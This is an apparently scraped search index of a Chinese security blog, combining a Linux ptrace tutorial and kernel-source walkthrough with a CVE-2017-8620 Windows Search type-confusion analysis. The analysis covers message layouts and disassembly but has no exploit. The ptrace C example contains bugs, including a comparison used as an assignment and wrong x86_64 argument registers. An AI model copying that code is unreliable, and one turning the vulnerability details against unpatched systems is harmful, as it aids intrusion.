\u003csys/syscall.h\u003e#include \u003csys/types.h\u003e#include \u003cunistd.h\u003e int main(int argc, char *argv[]){ pid_t child; long orig_rax, rax; long params[3]; int status; int insyscall = 0; struct user_regs_struct regs; child = fork(); if(child == 0){ ptrace(PTRACE_TRACEME, child, 8 * ORIG_RAX, NULL); execl(\"/bin/ls\", \"ls\", NULL); } else{ while(1){ wait(\u0026status); if(WIFEXITED(status)) break; orig_rax = ptrace(PTRACE_PEEKUSER, child, 8*ORIG_RAX, NULL); if(orig_rax == SYS_write){ if(insyscall == 0){ insyscall == 1; ptrace(PTRACE_GETREGS, child, NULL, \u0026regs); printf(\"Write called with %lld, %lld, %lld\\n\", regs.rbx, regs.rcx, regs.rdx); }else{ rax = ptrace(PTRACE_PEEKUSER, child, 8*rax, NULL); printf(\"Write returned with %ld\\n\", rax); insyscall = 0; } } ptrace(PTRACE_SYSCALL, child, NULL, NULL); } } return 0; } 执行结果： 整体输出与前面的代码无所差别，但在代码开发上使用了PTRACE_GETREGS来获取子进程的寄存器的值，简洁了很多。 ","date":"2020-10-18","objectID":"/2020/10/ptrace/:2:3","tags":["Security","Linux"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["Vuln"],"content":"三、sys_ptrace函数源码分析 ","date":"2020-10-18","objectID":"/2020/10/ptrace/:3:0","tags":["Security","Linux"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["Vuln"],"content":"1. Linux-2.6版本的源码分析 1. 源码分析 首先看一下linux-2.6.0的sys_ptrace的处理流程（以/arch/i386/kernel/ptrace.c为例）： /* * Note that this implementation of ptrace behaves differently from vanilla * ptrace. Contrary to what the man page says, in the PTRACE_PEEKTEXT, * PTRACE_PEEKDATA, and PTRACE_PEEKUSER requests the data variable is not * ignored. Instead, the data variable is expected to point at a location * (in user space) where the result of the ptrace call is written (instead of * being returned). */ asmlinkage int sys_ptrace(long request, long pid, long addr, long data) { struct task_struct *child; struct user * dummy = NULL; int i, ret; lock_kernel(); ret = -EPERM; if (request == PTRACE_TRACEME) { // 请求为PTRACE_TRACEME /* 检查是否做好被跟踪的准备 */ if (current-\u003eptrace \u0026 PT_PTRACED) goto out; ret = security_ptrace(current-\u003eparent, current); if (ret) goto out; /* 检查通过，在process flags中设置ptrace位*/ current-\u003eptrace |= PT_PTRACED; ret = 0; goto out; } /* 非PTRACE_TRACEME的请求*/ ret = -ESRCH; // 首先设置返回值为ESRCH，表明没有该进程，宏定义在errno-base.h头文件中 read_lock(\u0026tasklist_lock); child = find_task_by_pid(pid); // 查找task结构 if (child) get_task_struct(child); read_unlock(\u0026tasklist_lock); if (!child) // 没有找到task结构，指明所给pid错误 goto out; ret = -EPERM; // 返回操作未授权 if (pid == 1) // init进程不允许被调试 goto out_tsk; /* 请求为 PTRACE_ATTACH 时*/ if (request == PTRACE_ATTACH) { ret = ptrace_attach(child); // 进行attach goto out_tsk; } /* 检查进程是否被跟踪，没有的话不能执行其他功能； * 当不是PTRACE_KILL时，要求进程状态为TASK_STOPPED； * 被跟踪进程必须为当前进程的子进程 * 在之前是直接在该代码处实现以上逻辑，现在重新将以上功能封装成了ptrace_check_attach函数 */ ret = ptrace_check_attach(child, request == PTRACE_KILL); if (ret \u003c 0) goto out_tsk; /* 以下就为根据不同的request参数进行对应的处理了，用一个switch来总括，流程比较简单。*/ switch (request) { /* when I and D space are separate, these will need to be fixed. 这算预告吗？23333*/ case PTRACE_PEEKTEXT: /* read word at location addr. */ case PTRACE_PEEKDATA: { unsigned long tmp; int copied; copied = access_process_vm(child, addr, \u0026tmp, sizeof(tmp), 0); ret = -EIO; // 返回I/O错误 if (copied != sizeof(tmp)) break; ret = put_user(tmp,(unsigned long *) data); break; } /* read the word at location addr in the USER area. */ case PTRACE_PEEKUSR: { unsigned long tmp; ret = -EIO; if ((addr \u0026 3) || addr \u003c 0 || addr \u003e sizeof(struct user) - 3) break; tmp = 0; /* Default return condition */ if(addr \u003c FRAME_SIZE*sizeof(long)) tmp = getreg(child, addr); if(addr \u003e= (long) \u0026dummy-\u003eu_debugreg[0] \u0026\u0026 addr \u003c= (long) \u0026dummy-\u003eu_debugreg[7]){ addr -= (long) \u0026dummy-\u003eu_debugreg[0]; addr = addr \u003e\u003e 2; tmp = child-\u003ethread.debugreg[addr]; } ret = put_user(tmp,(unsigned long *) data); break; } /* when I and D space are separate, this will have to be fixed. */ case PTRACE_POKETEXT: /* write the word at location addr. */ case PTRACE_POKEDATA: ret = 0; if (access_process_vm(child, addr, \u0026data, sizeof(data), 1) == sizeof(data)) break; ret = -EIO; break; case PTRACE_POKEUSR: /* write the word at location addr in the USER area */ ret = -EIO; if ((addr \u0026 3) || addr \u003c 0 || addr \u003e sizeof(struct user) - 3) break; if (addr \u003c FRAME_SIZE*sizeof(long)) { ret = putreg(child, addr, data); break; } /* We need to be very careful here. We implicitly want to modify a portion of the task_struct, and we have to be selective about what portions we allow someone to modify. */ ret = -EIO; if(addr \u003e= (long) \u0026dummy-\u003eu_debugreg[0] \u0026\u0026 addr \u003c= (long) \u0026dummy-\u003eu_debugreg[7]){ if(addr == (long) \u0026dummy-\u003eu_debugreg[4]) break; if(addr == (long) \u0026dummy-\u003eu_debugreg[5]) break; if(addr \u003c (long) \u0026dummy-\u003eu_debugreg[4] \u0026\u0026 ((unsigned long) data) \u003e= TASK_SIZE-3) break; if(addr == (long) \u0026dummy-\u003eu_debugreg[7]) { data \u0026= ~DR_CONTROL_RESERVED; for(i=0; i\u003c4; i++) if ((0x5f54 \u003e\u003e ((data \u003e\u003e (16 + 4*i)) \u0026 0xf)) \u0026 1) goto out_tsk; } addr -= (long) \u0026dummy-\u003eu_debugreg; addr = addr \u003e\u003e 2; child-\u003ethread.debugreg[addr] = data; ret = 0; } break; case PTRACE_SYSCALL: /* continue and stop at next (return from) syscall */ case PTRACE_CONT: { /* restart after signal. */ long tmp; ret = -EIO; if ((unsigned long) data \u003e _NSIG) break; if (request == PTRACE_SYSCALL) { set_tsk_thread_flag","date":"2020-10-18","objectID":"/2020/10/ptrace/:3:1","tags":["Security","Linux"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["Vuln"],"content":"2. Linux-5.9版本的源码分析 1. 源码分析 Linux-5.9版本的源码分析： SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr, unsigned long, data) { struct task_struct *child; long ret; if (request == PTRACE_TRACEME) { // 请求是否为PTRACE_TRACEME ret = ptrace_traceme(); if (!ret) arch_ptrace_attach(current); goto out; } child = find_get_task_by_vpid(pid); // 通过pid请求task结构 if (!child) { // 请求失败，返回ESRCH ret = -ESRCH; goto out; } if (request == PTRACE_ATTACH || request == PTRACE_SEIZE) { ret = ptrace_attach(child, request, addr, data); /* * Some architectures need to do book-keeping after * a ptrace attach. */ if (!ret) arch_ptrace_attach(child); goto out_put_task_struct; } ret = ptrace_check_attach(child, request == PTRACE_KILL || request == PTRACE_INTERRUPT); if (ret \u003c 0) goto out_put_task_struct; /* 根据不同的架构进行不同的处理 */ ret = arch_ptrace(child, request, addr, data); if (ret || request != PTRACE_DETACH) ptrace_unfreeze_traced(child); out_put_task_struct: put_task_struct(child); out: return ret; } 2. 流程梳理 梳理上述源码，可以得到函数流程图如下： 3. 其他 Linux-5.9中使用了宏的方式，在进行函数调用时先进行函数替换解析出完整的函数体再进行具体执行（详细替换可参考系列（一）中的函数定义部分内容）。而且与Linux-2.6不同的是，kernel/ptrace.c负责总体调度，使用arch_ptrace进行不同架构的处理的选择： Linux-5.9版本的这种改动相比Linux-2.6的设计，更为清晰也更为安全（个人十分喜欢这种设计，由衷佩服这些优秀的开发者）。 ","date":"2020-10-18","objectID":"/2020/10/ptrace/:3:2","tags":["Security","Linux"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["Vuln"],"content":"四、Request参数详解 ","date":"2020-10-18","objectID":"/2020/10/ptrace/:4:0","tags":["Security","Linux"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["Vuln"],"content":"1. 参数简述 ptrace总计有4个参数，其中比较重要的是第一个参数–request，该参数决定了具体执行的系统调用功能。可取值如下（部分）： Request Description PTRACE_TRACEME 进程被其父进程跟踪，其父进程应该希望跟踪子进程。该值仅被tracee使用，其余的request值仅被tracer使用 PTRACE_PEEKTEXT, PTRACE_PEEKDATA 从tracee的addr指定的内存地址中读取一个字节作为ptrace()调用的结果 PTRACE_PEEKUSER 从tracee的USER区域中便宜为addr处读取一个字节，该值保存了进程的寄存器和其他信息 PTRACE_POKETEXT, PTRACE_POKEDATA 向tracee的addr内存地址处复制一个字节数据 PTRACE_POKEUSER 向tracee的USER区域中偏移为addr地址处复制一个字节数据 PTRACE_GETREGS 复制tracee的通用寄存器到tracer的data处 PTRACE_GETFPREGS 复制tracee的浮点寄存器到tracer的data处 PTRACE_GETREGSET 读取tracee的寄存器 PTRACE_SETREGS 设置tracee的通用寄存器 PTRACE_SETFPREGS 设置tracee的浮点寄存器 PTRACE_CONT 重新运行stopped状态的tracee进程 PTRACE_SYSCALL 重新运行stopped状态的tracee进程，但是使tracee在系统调用的下一个entry或从系统调用退出或在执行一条指令后stop PTRACE_SINGLESTEP 设置单步执行标志 PTRACE_ATTACH 跟踪指定pid的进程 PTRACE_DETACH 结束跟踪 备注：上述参数中，PTRACE_GETREGS, PTRACE_SETREGS, PTRACE_GETFPREGS, PTRACE_SETFPREGS参数为Interl386特有。 各参数所代表的值由/usr/include/sys/ptrace.h文件指定： ","date":"2020-10-18","objectID":"/2020/10/ptrace/:4:1","tags":["Security","Linux"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["Vuln"],"content":"2. 重要参数详解 下面将对request中几个常见、重要的参数进行详细解析： 1. PTRACE_TRACEME 描述 本进程被其父进程跟踪，如果子进程没有被其父进程跟踪，不能使用该选项。PTRACE_TRACEME 只被tracee使用。 定义 /** * ptrace_traceme -- helper for PTRACE_TRACEME * * Performs checks and sets PT_PTRACED. * Should be used by all ptrace implementations for PTRACE_TRACEME. */ static int ptrace_traceme(void) { int ret = -EPERM; write_lock_irq(\u0026tasklist_lock); // 首先让writer拿到读写lock，并且会disable local irp /* Are we already being traced? */ // 是否已经处于ptrace中 if (!current-\u003eptrace) { ret = security_ptrace_traceme(current-\u003eparent); /* * Check PF_EXITING to ensure -\u003ereal_parent has not passed * exit_ptrace(). Otherwise we don't report the error but * pretend -\u003ereal_parent untraces us right after return. */ if (!ret \u0026\u0026 !(current-\u003ereal_parent-\u003eflags \u0026 PF_EXITING)) { // 检查通过，将子进程链接到父进程的ptrace链表中 current-\u003eptrace = PT_PTRACED; ptrace_link(current, current-\u003ereal_parent); } } write_unlock_irq(\u0026tasklist_lock); return ret; } 分析 通过分析源码我们可以明确看到，PTRACE_TRACEME并没有真正使子进程停止。它内部完成的操作只有对父进程是否能对子进程进行trace的合法性检查，然后将子进程链接到父进程的饿ptrace链表中。真正导致子进程停止的是exec系统调用。 在系统调用成功后，kernel会判断该进程是否被ptrace跟踪。如果处于跟踪状态，kernel将会向该进程发送SIGTRAP信号，正是该信号导致了当前进程的停止。 /** * ptrace_event - possibly stop for a ptrace event notification * @event: %PTRACE_EVENT_* value to report * @message: value for %PTRACE_GETEVENTMSG to return * * Check whether @event is enabled and, if so, report @event and @message * to the ptrace parent. * * Called without locks. */ static inline void ptrace_event(int event, unsigned long message) { if (unlikely(ptrace_event_enabled(current, event))) { current-\u003eptrace_message = message; ptrace_notify((event \u003c\u003c 8) | SIGTRAP); } else if (event == PTRACE_EVENT_EXEC) { /* legacy EXEC report via SIGTRAP */ if ((current-\u003eptrace \u0026 (PT_PTRACED|PT_SEIZED)) == PT_PTRACED) send_sig(SIGTRAP, current, 0); } } 在exec.c中对该函数的调用如下： static int exec_binprm(struct linux_binprm *bprm) { pid_t old_pid, old_vpid; int ret, depth; /* Need to fetch pid before load_binary changes it */ old_pid = current-\u003epid; rcu_read_lock(); old_vpid = task_pid_nr_ns(current, task_active_pid_ns(current-\u003eparent)); rcu_read_unlock(); ....... audit_bprm(bprm); trace_sched_process_exec(current, old_pid, bprm); // 调用ptrace_event,传入的event为PTRACE_EVENT_EXEC // 直接走发送SIGTRAP的逻辑 ptrace_event(PTRACE_EVENT_EXEC, old_vpid); proc_exec_connector(current); return 0; } SIGTRAP信号的值为5，专门为调试设计。当kernel发生int 3时，触发回掉函数do_trap()，其代码如下： asmlinkage void do_trap(struct pt_regs *regs, unsigned long address) { force_sig_fault(SIGTRAP, TRAP_TRACE, (void __user *)address); regs-\u003epc += 4; } int force_sig_fault(int sig, int code, void __user *addr ___ARCH_SI_TRAPNO(int trapno) ___ARCH_SI_IA64(int imm, unsigned int flags, unsigned long isr)) { return force_sig_fault_to_task(sig, code, addr ___ARCH_SI_TRAPNO(trapno) ___ARCH_SI_IA64(imm, flags, isr), current); } 父进程唤醒wait对子进程进行监控，wait有3种退出情况（子进程正常退出、收到信号退出、收到信号暂停），对于PTRACE_TRACEME来说，对应的是第三种情况–收到信号后暂停。 PTRACE_TRACEME只是表明了子进程可以被trace，如果进程调用了PTRACE_TRACEME，那么该进程处理信号的方式会发生改变。例如一个进程正在运行，此时输入ctrl+c(SIGINT),则进程会直接退出；如果进程中有ptrace (PTRACE_TRACEME,0，NULL,NULL)，当输入CTRL+C时，该进程将会处于stopped的状态。 在sys_ptrace函数中，该部分的处理流程如下： 在5.9版中，单独写成了ptrace_traceme()函数，而在2.6版本中，直接在sys_ptrace的逻辑中进行实现： 虽然2个版本的核心功能相同，但是5.9版本的处理逻辑和情况考量相比2.6版本上升了很大高度。 2. PTRACE_ATTACH 描述 attach到pid指定的进程，使其成为调用进程的tracee。tracer会向tracee发送一个SIGSTOP信号，但不一定已通过此调用完成而停止；tracer使用waitpid()等待tracee停止。 定义 static int ptrace_attach(struct task_struct *task, long request, unsigned long addr, unsigned long flags) { bool seize = (request == PTRACE_SEIZE); int retval; retval = -EIO; /* I/O error*/ /* * 判断request是PTRACE_SEIZE还是PTRACE_ATTACH。 * 如果request为PTRACE_SEIZE，则进行必要的参数检查，错误时退出。 */ if (seize) { if (addr != 0) goto out; if (flags \u0026 ~(unsigned long)PTRACE_O_MASK) goto out; flags = PT_PTRACED | PT_SEIZED | (flags \u003c\u003c PT_OPT_FLAG_SHIFT); } else { flags = PT_PTRACED; } audit_ptrace(task); /* * 判断task进程是否为kernel thread（PF_KTHREAD）， * 调用same_thread_group(task, current)，判断task是否和current进程在同一个线程组，查看current进程是否有权限trace task进程。 * 如果不符合要求，则直接退出。 */ retval = -EPERM; /*","date":"2020-10-18","objectID":"/2020/10/ptrace/:4:2","tags":["Security","Linux"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["Vuln"],"content":"简单分析CVE-2017-8620","date":"2020-10-17","objectID":"/2020/10/CVE-2017-8620/","tags":["Security","Vulnerability"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/CVE-2017-8620/"},{"categories":["Vuln"],"content":"CVE-2017-8620 Windows Search远程代码执行漏洞简单分析 ","date":"2020-10-17","objectID":"/2020/10/CVE-2017-8620/:0:0","tags":["Security","Vulnerability"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/CVE-2017-8620/"},{"categories":["Vuln"],"content":"一、漏洞信息 ","date":"2020-10-17","objectID":"/2020/10/CVE-2017-8620/:1:0","tags":["Security","Vulnerability"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/CVE-2017-8620/"},{"categories":["Vuln"],"content":"1. 漏洞简述 漏洞名称：Windows Search Remote Code Execution Vulnerability 漏洞编号：CVE-2017-8620；Bugtraq ID：100034 漏洞类型：Remote Code Execution ","date":"2020-10-17","objectID":"/2020/10/CVE-2017-8620/:1:1","tags":["Security","Vulnerability"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/CVE-2017-8620/"},{"categories":["Vuln"],"content":"2. 组件概述 Windows搜索是一个桌面搜索平台，具有针对大多数常见文件类型和数据类型的即时搜索功能。 它的主要组件是WSearch Windows Service，它负责索引，组织和提取有关本地文件系统的信息。 此外，它实现了通用搜索服务（GSS），它是向搜索查询提供结果所需的后端功能。 客户端使用Windows搜索协议（WSP）向托管GSS的服务器发出查询。 WSP依靠名为管道协议的服务器消息块（SMB）进行消息传输和身份验证。 Microsoft Windows的所有版本均附带服务器消息块（SMB）协议的实现。 SMB是本机Windows网络框架，支持文件共享，网络打印，远程过程调用和其他功能。在Windows系统上，SMB协议通过附加的安全性，文件和磁盘管理支持扩展了CIFS协议。 通过各种SMB命令和子命令类型提供这些功能。 ","date":"2020-10-17","objectID":"/2020/10/CVE-2017-8620/:1:2","tags":["Security","Vulnerability"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/CVE-2017-8620/"},{"categories":["Vuln"],"content":"3. 漏洞概述 Windows搜索处理内存中的对象时，存在远程执行代码漏洞，成功利用此漏洞的攻击者可以控制受影响的系统。虽然漏洞与SMB协议本身无关，但攻击者可SMB目标作为攻击媒介，因此该漏洞面临着与Wannacry类似的大规模利用风险。CNVD对该漏洞的技术评级为“高危”。 ","date":"2020-10-17","objectID":"/2020/10/CVE-2017-8620/:1:3","tags":["Security","Vulnerability"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/CVE-2017-8620/"},{"categories":["Vuln"],"content":"4. 漏洞影响版本 • Microsoft Windows 10 for 32-bit Systems • Microsoft Windows 10 for x64-based Systems • Microsoft Windows 2012 R2 • Microsoft Windows 8.1 for 32-bit Systems • Microsoft Windows 8.1 for x64-based Systems • Microsoft Windows RT 8.1 • Microsoft Windows Windows 7 for 32-bit Systems Service Pack 1 • Microsoft Windows Windows 7 for x64-based Systems Service Pack 1 • Microsoft Windows Server 2008 for 32-bit Systems SP 2 (Server Core) • Microsoft Windows Server 2008 for 32-bit Systems SP2 • Microsoft Windows Server 2008 for Itanium-based Systems Service Pack 2 • Microsoft Windows Server 2008 for x64-based systems • Microsoft Windows Server 2008 R2 for Itanium-based Systems Service Pack 1 • Microsoft Windows Server 2012 R2 • Microsoft Windows Server 2012 R2 (Server Core) • Microsoft Windows Server 2016 • Microsoft Windows Server 2016 Server Core ","date":"2020-10-17","objectID":"/2020/10/CVE-2017-8620/:1:4","tags":["Security","Vulnerability"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/CVE-2017-8620/"},{"categories":["Vuln"],"content":"5. 解决方案 获取该漏洞补丁，地址：https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-8620 ","date":"2020-10-17","objectID":"/2020/10/CVE-2017-8620/:1:5","tags":["Security","Vulnerability"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/CVE-2017-8620/"},{"categories":["Vuln"],"content":"二、漏洞复现 ","date":"2020-10-17","objectID":"/2020/10/CVE-2017-8620/:2:0","tags":["Security","Vulnerability"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/CVE-2017-8620/"},{"categories":["Vuln"],"content":"三、漏洞分析 ","date":"2020-10-17","objectID":"/2020/10/CVE-2017-8620/:3:0","tags":["Security","Vulnerability"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/CVE-2017-8620/"},{"categories":["Vuln"],"content":"1. 漏洞基本信息 漏洞文件：tquery.dll 漏洞函数：CRegXpr::CRegXpr() 漏洞对象：一个CPropertyRestriction结构，其prval具有与VT_LPWSTR的vType混淆的VT_LPWSTR以外的vType。 ","date":"2020-10-17","objectID":"/2020/10/CVE-2017-8620/:3:1","tags":["Security","Vulnerability"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/CVE-2017-8620/"},{"categories":["Vuln"],"content":"2. 背景知识 备注：此处略去SMB相关介绍，漏洞自身与SMB关系不大，SMB只是作为WSP传输的工具协议，使用的pipe名称为MsFteWds。 Windows Search Protocol(WSP) 使用WSP的最小搜索查询其流程大概如下： [ Client ] --------------------\u003e [ Server ] - CPMConnectIn [ Client ] \u003c-------------------- [ Server ] - CPMConnectOut [ Client ] --------------------\u003e [ Server ] - CPMCreateQueryIn [ Client ] \u003c-------------------- [ Server ] - CPMCreateQueryOut [ Client ] --------------------\u003e [ Server ] - CPMSetBindingsIn request [ Client ] \u003c-------------------- [ Server ] - CPMSetBindingsIn response [ Client ] --------------------\u003e [ Server ] - CPMGetRowsIn [ Client ] \u003c-------------------- [ Server ] - CPMGetRowsOut [ Client ] --------------------\u003e [ Server ] - CPMGetFreeCursorIn [ Client ] \u003c-------------------- [ Server ] - CPMGetFreeCursorOut [ Client ] --------------------\u003e [ Server ] - CPMDisconnect CPMConnectIn消息开始于客户端和服务器之间的会话，CPMCreateQueryIn包含查询条件并创建新查询，CPMSetBindingsIn指定如何在CPMGetRowsOut中构建搜索结果，CPMGetRowsIn从服务器返回的查询结果中请求数据。 所有的WSP消息以一个16字节的头部开始，其结构如下： Offset Size (bytes) Field -------------------------------------------- 0x00 0x4 _msg 0x04 0x4 _status 0x08 0x4 _ulChecksum 0x0c 0x4 _ulReserved2 _msg字段标识标头部后面的消息类型（有的一个value表示两种类型，此时要根据数据流的传输方向判定具体代表哪种类型。带\"In\"字符的是从client到server，带\"Out\"字符的是从server到client）； _status字段表明所请求操作的状态，由服务器填充； _ulChecksum包含从_ulReserved2字段后面开始的消息的校验和； _ulReserved2字段除了后续的消息为CPMGetRowsIn之外，都必须设置为0。 跟本漏洞相关的是CPMCreateQueryIn消息， 此消息创建一个新的搜索查询，其结构如下： Offset Size (bytes) Field -------------------------------------------------------------------- 0x00 0x4 Size 0x04 0x1 CColumnSetPresent 0x05 0x3 paddingCColumnSet 0x08 var (w) ColumnSet 0x08 + w 0x1 CRestrictionPresent 0x09 + w var (x) RestrictionArray 0x09 + w + x 0x1 CSortSetPresent 0x0a + w + x 0x3 paddingCCortSet 0x0d + w + x var (y) SortSet 0x0d + w + x + y 0x1 CCategorizationSetPresent 0x0e + w + x + y 0x3 paddingCCategorizationSet 0x11 + w + x + y var (z) CCategorizationSet 0x11 + w + x + y + z 0x14 RowSetProperties 0x25 + w + x + y + z var (m) PidMapper 0x25 + w + x + y + z + m var (n) GroupArray 0x25 + w + x + y + z + m + n 0x4 Lcid 从上面的结构中可以看出，有很多字段数值大小不是固定的，这对后续的流量监测造成很大困难。 在上面的结构中，需要重点关注的字段是CRestrictionPresent和RestrictionArray。 前者标识了RestrictionArray字段是否存在（CRestrictionPresent为0时，RestrictionArray字段不能存在；CRestrictionPresent字段为非0时，RestrictionArray字段必须存在），后者包含描述查询命令树的CRestrictionArray结构。 命令树是为搜索查询指定的限制条件和排序顺序的组合。 CRestrictionArray的详细结构如下： Offset Size(bytes) Field ------------------------------------------- 0x00 0x1 count 0x01 0x1 isPresent 0x02 0x3 padding 0x05 var Restriction count字段表明Restriction字段中包含CRestriction的数量，该字段必须设置为0x01； isPresent字段标识Restriction字段是否存在是否包含CRestriction结构，值为0（省略）或1（不省略）； CRestriction指示用于命令树节点的限制类型，类型决定了在该结构的\"Restriction\"字段中找到的内容，格式如下： Offset Size(bytes) Field ------------------------------------------ 0x00 0x4 ulType 0x04 0x4 Weight 0x08 var Restriction ulType标识Restriction字段中存在的限制结构的类型。 此漏洞涉及具有指定CPropertyRestriction的ulType为RTProperty(0x5)的CRestrictions。 某些CRestriction类型可以包含嵌套的CRestrictions，形成一个限制树。因此，CPropertyRestriction可以嵌入以下任何限制条件中： RTAnd (0x1), Restriction contains a CNodeRestriction structure RTOr (0x2), Restriction contains a CNodeRestriction structure RTNot (0x3), Restriction contains a CRestriction structure RTProximity (0x6), Restriction contains a CNodeRestriction structure RTVector (0x7), Restriction contains a CVectorRestriction structure RTCoerce_Add (0xA), Restriction contains a CCoercionRestriction structure RTCoerce_Multiply (0xB), Restriction contains a CCoercionRestriction structure RTCoerce_Absolute (0xC), Restriction contains a CCoercionRestriction structure RTPhrase (0x00FFFFFD), Restriction contains a CNodeRestriction structure 上述列表中的限制具有以下结构： CNodeRestriction: Offset Size（bytes) Field ---------------------------------------------------------------- 0x00 0x4 cNode (number of structures in paNode) 0x04 var paNode (array of CRestriction structures) CVectorRestriction: Offset Size (bytes) Field ------------------------------------------------------------ 0x00 var (n) pres (CNodeRestriction structure) 0x00 ","date":"2020-10-17","objectID":"/2020/10/CVE-2017-8620/:3:2","tags":["Security","Vulnerability"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/CVE-2017-8620/"},{"categories":["Vuln"],"content":"3. 详细分析 当运行了GSS服务的server接受到CPMCreateQueryIn消息时，会解析RestrictionArray并为每个限制条件实例化相关对象。如果服务解析的是一个响应CPropertyR etriction的CRestriction，此时ulType的值为0x5，则解组prval字段并实例化CBaseStorageVariant对象。如果CPropertyRestriction的relop字段的值为0x6，表示采用的操作是正则表达式比较，则服务开始将正则表达式解析为确定性有限自动机（DFA）。 但是，在解析正则表达式之前，服务未能成功验证prval字段中的CBaseStorageVariant对象的类型是否为VT_LPWSTR。如果类型不是VT_LPWSTR，则会发生类型混淆。 远程未经身份验证的攻击者可以通过向目标服务器发送恶意CPMCreateQueryIn消息来利用这些漏洞。成功利用可能会导致在SYSTEM上下文中的目标服务器上执行远程代码。 需要注意，SMB和WSP中的所有多字节整数都以little-endian字节顺序存储 ","date":"2020-10-17","objectID":"/2020/10/CVE-2017-8620/:3:3","tags":["Security","Vulnerability"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/CVE-2017-8620/"},{"categories":["Vuln"],"content":"4. 源码分析 使用IDA反编译存在漏洞的文件： tquery.dll version 7.0.7601.23861 # CPropertyRestriction::CPropertyRestriction(long, class PDeSerStream \u0026): .text:6EC88B61 push ebx ; struct PDeSerStream * .text:6EC88B62 lea ecx, [ebp+var_20] .text:6EC88B65 call ?SetLPWSTR@CStorageVariant@@QAEXPBGI@Z ; 开始进行prval解组 .text:6EC88B6A push eax .text:6EC88B6B mov ecx, edi .text:6EC88B6D mov byte ptr [ebp+var_4], 3 .text:6EC88B71 call ??4CStorageVariant... ; CStorageVariant::operator= # Parse(const struct CRestriction *, struct CTimeLimit *): .text:6ED350B3 cmp eax, 6 ; eax contains relop, check if relop indicates regexp .text:6ED350B6 jnz short loc_6ED350DE .text:6ED350B8 push 40h ; unsigned int .text:6ED350BA call ?ciNew@@YGPAXI@Z ; ciNew(uint) .text:6ED350BF mov [ebp+arg_0], eax .text:6ED350C2 mov ecx, [esi+14h] .text:6ED350C5 mov edx, [esi+10h] .text:6ED350C8 push ecx .text:6ED350C9 push edx .text:6ED350CA push [ebp+arg_4] .text:6ED350CD mov ecx, eax .text:6ED350CF push esi .text:6ED350D0 mov byte ptr [ebp+var_4], 7 .text:6ED350D4 call ??0CRegXpr@@QA... ; CRegXpr(), 解析正则表达式 # CRegXpr::CRegXpr(class CInternalPropertyRestriction *, class CTimeLimit \u0026, unsigned long, unsigned long): .text:6ED37ABC push 0A8h ; unsigned int .text:6ED37AC1 call ?ciNew@@YGPAXI@Z ; ciNew(uint) .text:6ED37AC6 mov [ebp+var_7C], eax .text:6ED37AC9 push [ebp+var_78] ; int .text:6ED37ACC mov ecx, [esi+20h] .text:6ED37ACF push 0 ; int .text:6ED37AD1 push [ebp+arg_4] ; int .text:6ED37AD4 mov byte ptr [ebp+var_4], 6 .text:6ED37AD8 push ecx ; unsigned __int16 * .text:6ED37AD9 mov ecx, eax .text:6ED37ADB call ??0CDFA@@Q... ; CDFA::CDFA(), 直接进行vValue解析，并没有进行类型检查 # CNFA::CNFA(unsigned __int16 *, int, int): .text:6AF2781E mov dx, [eax] ; eax 指向 VT_LPWSTR .text:6AF27821 inc eax .text:6AF27822 inc eax .text:6AF27823 cmp dx, di .text:6AF27826 jnz short loc_6AF2781E ","date":"2020-10-17","objectID":"/2020/10/CVE-2017-8620/:3:4","tags":["Security","Vulnerability"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/CVE-2017-8620/"},{"categories":["Vuln"],"content":"5. 攻击流量 ","date":"2020-10-17","objectID":"/2020/10/CVE-2017-8620/:3:5","tags":["Security","Vulnerability"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/CVE-2017-8620/"},{"categories":["Vuln"],"content":"四、漏洞检测和防御 根据漏洞原理，需要对SMB、WSP的诸多命令和结构进行遍历，且WSP命令中存在诸多变量字段，数值和长度无法确定，故很难在流量侧进行防御。 ","date":"2020-10-17","objectID":"/2020/10/CVE-2017-8620/:4:0","tags":["Security","Vulnerability"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/CVE-2017-8620/"},{"categories":["Vuln"],"content":"简单分析CVE-2020-0796","date":"2020-03-18","objectID":"/2020/03/CVE-2020-0796/","tags":["Security","Reversing","Vulnerability"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/03/CVE-2020-0796/"},{"categories":["Vuln"],"content":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796） ","date":"2020-03-18","objectID":"/2020/03/CVE-2020-0796/:0:0","tags":["Security","Reversing","Vulnerability"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/03/CVE-2020-0796/"},{"categories":["Vuln"],"content":"前言 